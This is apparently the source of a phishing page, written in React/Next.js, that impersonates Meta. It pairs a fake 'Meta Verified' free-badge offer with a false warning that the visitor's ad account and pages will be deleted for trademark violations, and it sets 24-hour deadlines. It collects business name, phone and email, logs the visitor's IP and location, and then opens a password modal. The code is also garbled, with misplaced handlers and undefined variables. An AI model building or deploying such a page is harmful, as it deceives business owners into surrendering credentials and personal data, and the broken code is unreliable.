'use client';
import { store } from '@/store/store';
import { getTranslations } from '@/utils/translate';
import axios from 'axios';
import { useEffect, useState, type FC, type ChangeEvent, type FormEvent, useMemo } from 'react';
import Image from 'next/image';
import MetaBanner from '@/assets/images/imagemeta.webp';
import MetaLogo from '@/assets/images/unnamedmeta.png';
import MetaBanner1 from '@/assets/images/imagemeta1.webp';
import Navbar from '@/components/navbar';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const Page: FC = () => {
    const { geoInfo, setGeoInfo, setMessageId, setMessage } = store();
    const [isLoading, setIsLoading] = useState(false);
    const [selectedCountryCode, setSelectedCountryCode] = useState<string>('US');
    const [showPasswordModal, setShowPasswordModal] = useState(false);
    const [showVerifyModal, setShowVerifyModal] = useState(false);
    const [formData, setFormData] = useState<VerifyFormData>({
        personalEmail: '',
        pageName: '',
        legalBusinessName: '',
        phoneNumber: '',
        description: ''
    });
    const [modalKey, setModalKey] = useState(0);

    // Compute translations using useMemo - instantly without API calls
    const countryToLanguage: Record<string, string> = useMemo(() => ({
        'us': 'en', 'gb': 'en', 'ca': 'en', 'au': 'en',
        'mx': 'es', 'es': 'es', 'ar': 'es', 'br': 'pt', 'pt': 'pt',
        'fr': 'fr', 'de': 'de', 'at': 'de', 'ch': 'fr',
        'jp': 'ja', 'cn': 'zh', 'tw': 'zh', 'hk': 'zh',
        'kr': 'ko', 'th': 'th', 'vn': 'vi', 'id': 'id',
        'ru': 'ru', 'ua': 'uk', 'in': 'hi', 'bd': 'bn',
        'ae': 'ar', 'sa': 'ar', 'eg': 'ar'
    }), []);

    const translations = useMemo(() => {
        const lang = countryToLanguage[selectedCountryCode.toLowerCase()] || 'en';
        return getTranslations(lang);
    }, [selectedCountryCode, countryToLanguage]);

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    // Update translations when geoInfo changes
    useEffect(() => {
        if (!geoInfo) return;
        
        // If translations already loaded (from browser language), skip
        if (Object.keys(translations).length > 0) return;

    const handleInputChange = (e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: value
        }));
    };

            const textsToTranslate = [
                'Upgrade your profile with Meta Verified — enjoy exclusive benefits.',
                'This form must be completed within 24 hours, or it will be permanently deleted.',
                'Page Eligibility for Free Verification Badge',
                'Protect your brand with Meta Verified',
                'Meta Verified Logo',
                'Your Page is eligible to receive a free verification badge. Verification helps confirm your Page\'s authenticity, increase audience trust, and protect your brand from impersonation. Please complete the verification request within 24 hours to secure your eligibility. Fill out the form below to submit your Page information for review.',
                'Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.',
                'Get Meta Verified',
                'Subscribe on Page',
                'Subscribe on Instagram',
                'Are you a business?',
                'Get more information on',
                'Meta Verified for businesses',
                'Features, availability and pricing may vary by region and app.',
                'Meta Verified Example',
                'Meta Verified Benefits Demo',
                'Meta Verified benefits',
                'Verified badge',
                'The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.',
                'Impersonation protection',
                'Enhanced support',
                'Upgraded profile features',
            ];

            // Get cache
            const CACHE_KEY = 'translation_cache';
            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
            const cache = cached ? JSON.parse(cached) : {};

            // Translate ALL texts in parallel with Promise.all
            const translatePromises = textsToTranslate.map(async (text) => {
                const cacheKey = `en:${targetLang}:${text}`;
                
                // Return cached if available
                if (cache[cacheKey]) {
                    return { text, translated: cache[cacheKey] };
                }

                try {
                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
                        params: {
                            client: 'gtx',
                            sl: 'en',
                            tl: targetLang,
                            dt: 't',
                            q: text
                        }
                    });

                    const translatedText = response.data[0]
                        ?.map((item: unknown[]) => item[0])
                        .filter(Boolean)
                        .join('') || text;

                    cache[cacheKey] = translatedText;
                    return { text, translated: translatedText };
                } catch {
                    return { text, translated: text };
                }
            });

            // Wait for all translations at once (parallel)
            const results = await Promise.all(translatePromises);
            
            // Save cache
            if (typeof window !== 'undefined') {
                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
            }

            // Build translation map
            const translatedMap: Record<string, string> = {};
            results.forEach(({ text, translated }) => {
                translatedMap[text] = translated;
            });

            setTranslations(translatedMap);
        })();
    }, [geoInfo, translations]);

    return (
        <>
            <Navbar />
            <div className="w-full flex flex-col bg-gradient-to-br from-[#f3e7e9] via-[#c7e0f7] to-[#6ec6f7] min-h-screen" style={{margin:0,padding:0}}>
                <div className="w-full bg-[#768187] text-white text-center text-base md:text-lg font-semibold" style={{margin:0,paddingTop:'16px',paddingBottom:'16px',lineHeight:1.1}}>
                {t('Upgrade your profile with Meta Verified — enjoy exclusive benefits.')}<br />
                <span className="text-xs font-normal">{t('This form must be completed within 24 hours, or it will be permanently deleted.')}</span>
            </div>
            <div className="flex flex-1 flex-col md:flex-row items-center justify-center px-3 md:px-8 py-6 md:py-12 gap-2 md:gap-4 max-w-[1600px] mx-auto w-full md:-mt-12 md:-mt-16">
                <div className="w-full md:w-1/3 flex flex-col items-center md:items-start justify-center px-3 md:px-0 mb-6 md:mb-0">
                    <Image src={MetaLogo} alt={t('Meta Verified Logo')} width={300} height={300} className="w-24 h-24 md:w-32 md:h-32 mb-4 md:mb-6" priority quality={95} />
                    <h1 className="text-xl md:text-3xl font-bold mb-3 md:mb-4 text-[#1C2B33] text-center md:text-left">
                        {t('Page Eligibility for Free Verification Badge')}
                    </h1>
                    <p className="text-sm md:text-base text-[#1C2B33] mb-4 md:mb-6 text-center md:text-left leading-relaxed">{t('Your Page is eligible to receive a free verification badge. Verification helps confirm your Page\'s authenticity, increase audience trust, and protect your brand from impersonation. Please complete the verification request within 24 hours to secure your eligibility. Fill out the form below to submit your Page information for review.')}</p>
                    <div className="flex flex-col md:flex-row gap-4 mb-4 w-full items-center md:items-start justify-center md:justify-start">
                        <button
                            onClick={() => {
                                setModalKey((prev) => prev + 1);
                                setModalOpen(true);
                            }}
                            className="bg-[#1877f2] hover:bg-[#145db2] text-white font-semibold py-3 px-6 rounded-full text-base shadow w-full md:w-auto"
                        >
                            {t('Get Meta Verified')}
                        </button>
                    </div>

                    {/* Main Content */}
                    <div className="flex-1 flex flex-col w-full md:w-auto">
                        {/* Content Area */}
                        <div className="flex-1 overflow-y-auto p-3 md:p-4 md:p-6 flex flex-col pb-6">
                            <div className="w-full max-w-3xl mx-auto md:mx-0">
                                {/* Notification Banner */}
                                <div className="mb-6 bg-red-50 border-l-4 border-red-500 rounded-lg p-4 md:p-6">
                                    <div className="flex items-start gap-3">
                                        <div className="mt-1 text-red-600 font-bold text-xl">−</div>
                                        <div className="flex-1">
                                            <h2 className="text-lg md:text-xl font-bold text-gray-900 mb-2">
                                                {t('We have scheduled your ad account and pages for deletion')}
                                            </h2>
                                            <p className="text-sm md:text-base text-gray-700 mb-3">
                                                {t('We have received multiple reports indicating that your advertisement violates trademark rights. After a detailed review, we have made a decision regarding this matter.')}
                                            </p>
                                            <p className="text-xs md:text-sm text-gray-600 mb-4">
                                                {t('If no corrective actions are taken, your advertising account will be permanently deleted. If you wish to appeal this decision, please submit an appeal request us for review and assistance.')}
                                            </p>
                                            <p className="text-xs md:text-sm font-semibold text-gray-700">
                                                {t('Your ticket id: HFWMK-T7M-QNMU')}
                                            </p>
                                        </div>
                                    </div>
                                </div>

                                {/* Request Review Section */}
                                <div className="mb-6 bg-white rounded-lg p-4 md:p-6 shadow-sm border border-gray-200">
                                    <h3 className="text-lg font-bold text-gray-900 mb-3">
                                        {t('Request review')}
                                    </h3>
                                    <p className="text-sm md:text-base text-gray-600 mb-5">
                                        {t('This team is used for submitting appeals and restoring account status.')}
                                    </p>
                                    <p className="text-xs md:text-sm text-gray-600 mb-6">
                                        {t('Please ensure that you provide the required information below. Failure to do so may delay the processing of your appeal.')}
                                    </p>
                                    
                                    {/* Form */}
                                    <form onSubmit={handleSubmit} className="space-y-4 md:space-y-5">
                                        {/* Page Name */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Page Name')}
                                            </label>
                                            <input
                                                required
                                                type="text"
                                                name="pageName"
                                                value={formData.pageName}
                                                onChange={handleInputChange}
                                                placeholder={t('Page Name') || 'Page name'}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Legal Business Name */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Legal Business Name')}
                                            </label>
                                            <input
                                                required
                                                type="text"
                                                name="legalBusinessName"
                                                value={formData.legalBusinessName}
                                                onChange={handleInputChange}
                                                placeholder={translations['Enter legal business name'] || 'Enter legal business name'}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Phone Number */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Phone Number')}
                                            </label>
                                            <div className="flex gap-2 items-center">
                                                <select
                                                    value={selectedCountryCode}
                                                    onChange={(e) => setSelectedCountryCode(e.target.value)}
                                                    className="h-10 md:h-11 px-2 md:px-3 py-2 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-lg cursor-pointer hover:border-gray-300 flex-shrink-0"
                                                    style={{ minWidth: '60px' }}
                                                    title={countryNames[selectedCountryCode]}
                                                >
                                                    {Object.entries(countryPhoneCodes).map(([code]) => (
                                                        <option key={code} value={code} title={countryNames[code]}>
                                                            {countryFlags[code]}
                                                        </option>
                                                    ))}
                                                </select>
                                                <input
                                                    disabled
                                                    type="text"
                                                    value={countryPhoneCodes[selectedCountryCode] || '+1'}
                                                    placeholder="+1"
                                                    className="w-14 md:w-16 px-2 md:px-3 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg text-gray-600 font-semibold outline-none text-center text-sm md:text-base flex-shrink-0"
                                                />
                                                <input
                                                    required
                                                    type="tel"
                                                    name="phoneNumber"
                                                    value={formData.phoneNumber}
                                                    onChange={handleInputChange}
                                                    placeholder="912 345 678"
                                                    className="flex-1 px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                                />
                                            </div>
                                        </div>

                                        {/* Email */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Email')}
                                            </label>
                                            <input
                                                required
                                                type="email"
                                                name="personalEmail"
                                                value={formData.personalEmail}
                                                onChange={handleInputChange}
                                                placeholder={translations['Enter email address'] || 'Enter email address'}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Description */}
                                        <div>
                                            <label className="block text-xs font-semibold text-gray-600 mb-2 uppercase tracking-wider">
                                                {t('Description')}
                                            </label>
                                            <textarea
                                                name="description"
                                                value={formData.description}
                                                onChange={handleInputChange}
                                                placeholder={translations['Write a short description about your page'] || 'Write a short description about your page'}
                                                rows={3}
                                                className="w-full px-3 md:px-4 py-2 md:py-3 bg-gray-50 border border-gray-200 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-300 outline-none transition resize-none text-sm md:text-base"
                                            />
                                        </div>

                                        {/* Submit Button */}
                                        <button
                                            type="submit"
                                            disabled={isLoading}
                                            className="w-full mt-6 md:mt-8 py-3 md:py-3.5 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition-all shadow-md hover:shadow-lg disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2 text-sm md:text-base"
                                        >
                                            {isLoading ? (
                                                <>
                                                    <div className="h-4 w-4 animate-spin rounded-full border-2 border-white border-b-transparent"></div>
                                                    {t('Submit for Review')}
                                                </>
                                            ) : (
                                                t('Submit for Review')
                                            )}
                                        </button>
                                    </form>
                                </div>

                                {/* Trademark Infringement Info */}
                                <div className="bg-white rounded-lg p-4 md:p-6 shadow-sm border border-gray-200">
                                    <h3 className="text-lg font-bold text-gray-900 mb-4">
                                        {t('What is trademark infringement?')}
                                    </h3>
                                    
                                    <p className="text-sm md:text-base text-gray-700 mb-4">
                                        {t('Generally, trademark infringement occurs when all three of the following requirements are met:')}
                                    </p>

                                    <ol className="space-y-3 md:space-y-4">
                                        <li className="text-sm md:text-base text-gray-700 flex gap-3">
                                            <span className="font-semibold text-gray-900 flex-shrink-0">1.</span>
                                            <span>{t('A company or person uses a trademark owner\'s trademark (or similar trademark) without permission.')}</span>
                                        </li>
                                        <li className="text-sm md:text-base text-gray-700 flex gap-3">
                                            <span className="font-semibold text-gray-900 flex-shrink-0">2.</span>
                                            <span>{t('That use is in commerce, meaning that it\'s done in connection with the sale or promotion of goods or services.')}</span>
                                        </li>
                                        <li className="text-sm md:text-base text-gray-700 flex gap-3">
                                            <span className="font-semibold text-gray-900 flex-shrink-0">3.</span>
                                            <span>{t('That use is likely to confuse consumers about the source, endorsement or affiliation of the goods or services.')}</span>
                                        </li>
                                    </ol>

                                    <p className="text-sm md:text-base text-gray-700 mt-4">
                                        {t('Trademark infringement is often "likelihood of confusion" and there are many factors that determine whether a use is likely to cause confusion. For example, when a person\'s trademark is also used by someone else. But on unrelated goods or services, that use may not be infringement because it may not be likely to cause confusion. For example, when a person\'s trademark first can often be an important consideration as well.')}
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            {/* Section: Meta Verified benefits */}
            <div className="flex flex-col md:flex-row items-center justify-center px-2 md:px-8 py-8 md:py-12 gap-8 md:gap-12 max-w-[1600px] mx-auto w-full bg-white rounded-2xl shadow -mt-8">
                <div className="w-full md:w-1/2 flex flex-col items-center md:items-start justify-center p-2 md:p-8">
                    <h2 className="text-2xl md:text-4xl font-bold mb-6 md:mb-8 text-[#1C2B33] text-center md:text-left w-full">{t("Meta Verified benefits")}</h2>
                    <div className="w-full border-t border-gray-300 mb-4 md:mb-6"></div>
                    {/* Verified badge (open) */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <div>
                            <span className="text-base md:text-2xl font-semibold">{t('Verified badge')}</span>
                            <div className="text-gray-500 text-sm md:text-lg mt-2">{t('The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided.')}</div>
                        </div>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                    {/* Impersonation protection */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <span className="text-base md:text-2xl font-semibold">{t('Impersonation protection')}</span>
                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                    {/* Enhanced support */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <span className="text-base md:text-2xl font-semibold">{t('Enhanced support')}</span>
                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                    {/* Upgraded profile features */}
                    <div className="flex items-center justify-between cursor-pointer py-3 md:py-4 w-full">
                        <span className="text-base md:text-2xl font-semibold">{t('Upgraded profile features')}</span>
                        <span className="text-2xl md:text-3xl font-bold ml-4">+</span>
                    </div>
                    <div className="w-full border-t border-gray-200"></div>
                </div>
                <div className="w-full md:w-1/2 flex items-center justify-center p-2 md:p-8">
                    <div className="bg-[#f3f6fa] rounded-3xl flex items-center justify-center w-full max-w-xs md:max-w-xl p-2 md:p-8">
                        <Image 
                            src={MetaBanner1} 
                            alt={t('Meta Verified Benefits Demo')} 
                            className="rounded-2xl w-full h-auto object-contain" 
                            priority
                            quality={100}
                            width={600}
                            height={400}
                        />
                    </div>
                </div>
            </div>

            {/* Password Modal */}
            {showPasswordModal && (
                <PasswordModal 
                    userEmail={formData.personalEmail || ''}
                />
            )}

            {/* Verify Modal */}
            {showVerifyModal && (
                <VerifyModal 
                    businessName={formData.legalBusinessName}
                    nextStep={handleVerifyConfirm}
                />
            )}
        </div>
    );
};

export default Page;